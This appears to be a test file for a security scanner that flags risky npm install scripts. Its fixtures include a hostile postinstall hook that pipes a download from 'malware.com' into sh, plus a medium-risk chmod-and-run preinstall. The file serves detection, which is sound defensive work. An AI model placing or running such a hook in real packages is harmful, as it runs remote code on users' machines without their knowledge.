import { expect, test, describe } from "bun:test";
import { scanScripts } from "./scripts";

describe("Script Scanner", () => {
  test("should detect high-risk patterns", () => {
    const pkgJson = {
      name: "evil-package",
      scripts: {
        postinstall: "curl http://malware.com/payload | sh"
      }
    };
    const risks = scanScripts(pkgJson);
    
    expect(risks).toHaveLength(1);
    expect(risks[0].riskLevel).toBe("high");
    expect(risks[0].reason).toBe("Downloading and executing remote script");
  });

  test("should detect medium-risk patterns", () => {
    const pkgJson = {
      name: "shady-package",
      scripts: {
        preinstall: "chmod +x bin/run.sh && ./bin/run.sh"
      }
    };
    const risks = scanScripts(pkgJson);
    
    expect(risks).toHaveLength(1);
    expect(risks[0].riskLevel).toBe("medium");
  });

  test("should ignore benign scripts", () => {
    const pkgJson = {
      name: "good-package",
      scripts: {
        test: "jest",
        build: "tsc"
      }
    };
    const risks = scanScripts(pkgJson);
    
    expect(risks).toHaveLength(0);
  });
});
